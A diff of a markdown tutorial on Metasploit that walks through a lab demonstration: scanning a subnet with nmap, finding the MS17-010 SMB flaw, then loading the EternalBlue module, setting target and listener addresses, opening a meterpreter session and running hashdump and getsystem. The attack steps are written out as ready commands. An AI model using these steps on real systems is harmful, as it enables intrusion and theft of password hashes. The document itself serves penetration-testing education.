@@ -1,3 +1,4 @@
+
 # Metasploit
 
 Metasploit is an exploitation framework (aka penetration framework) , build for security professional to support penetration testing.
@@ -70,8 +71,8 @@ style F fill:orange,color:black,stroke-width:1px
  - The firewall of the windows is already disabled in this demonstration
  - The Attacker and Target machine is connected over the save network. i.e., they are in same subnet.  
 
-### Attacker Machine:
-****
+### In Attacker's Machine:
+<hr>
 Open msfconsole
 ```bash
 sudo msfconsole
@@ -95,7 +96,7 @@ One of this host could be the target machine we are looking for, so let's perfor
 msf> nmap -O 192.168.126.0/24
 ```
 ![scan 2  result](https://github.com/000Sushant/metasploit_docs/blob/main/scan2.png)
-we found the IP address of the target machine.
+We found the IP address of the target machine.
 Target IP: 192.168.126.132
 
 **Finding Vulnerability in Target Machine**
@@ -108,8 +109,66 @@ msf> nmap --script="vuln" 192.168.126.132
 
 We identified that the target's machine is vulnerable for remote code execution, by the exploit smb-vuln-ms17-010. more details could be gathered from [CVE-2017-0143](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143).
 
-**Searching and Setting up the Exploit**
+**Finding and Setting up the Exploit**
+
+search is there is any exploit module available to exploit the Windows's SMB vulnerability ms17-101.
+
+```bash
+msf> search ms17 platform:windows
+```
+
+![exploit 1 result](https://github.com/000Sushant/metasploit_docs/blob/main/exploit1.png)
 
 
+As we can see in the description of module index 0, it is mentioned that it provides an exploit named EternalBlue for MS17-010 vulnerability. We are going to use EternalBlue exploit, although you can also go for other modules.
 
- 
+```bash
+msf> use 0
+msf> show options
+```
+
+**NOTE:** You can use "show payload" to explore and change payload attached with the exploit.
+
+![exploit 2 result](https://github.com/000Sushant/metasploit_docs/blob/main/exploit2.png)
+
+
+As you can see, the place of RHOST is not set and mandatory to fill.
+
+```bash
+msf> set RHOST 192.168.126.132
+```
+
+![exploit 3 result](https://github.com/000Sushant/metasploit_docs/blob/main/exploit3.png)
+
+**NOTE:** If your LHOST and LPORT is not set by default you can run following command to set LHOST to attacker's IP and LPORT to any random free port.
+```bash
+msf> set LHOST 192.168.126.128
+msf> set LPORT 4444
+```
+**Exploiting to Gain Access**
+
+After setting up the environment just type exploit or run to execute the payload.
+```bash
+msf> exploit
+```
+
+Wait for few seconds and you will see an active meterpreter session. To verify your access, you can run following commands.
+
+```bash
+meterpreter> sysinfo
+meterpreter> pwd
+```
+
+![success 1 result](https://github.com/000Sushant/metasploit_docs/blob/main/success1.png)
+
+**Post Exploitation Steps**
+commands like hashdump and getsystem could be used to perform privilege escalation. 
+
+```bash
+meterpreter> hashdump
+meterpreter> getsystem
+```
+
+![success 2 result](https://github.com/000Sushant/metasploit_docs/blob/main/success2.png)
+
+However, it looks like the exploit we used also gave us the admin privilege in the provided meterpreter session.
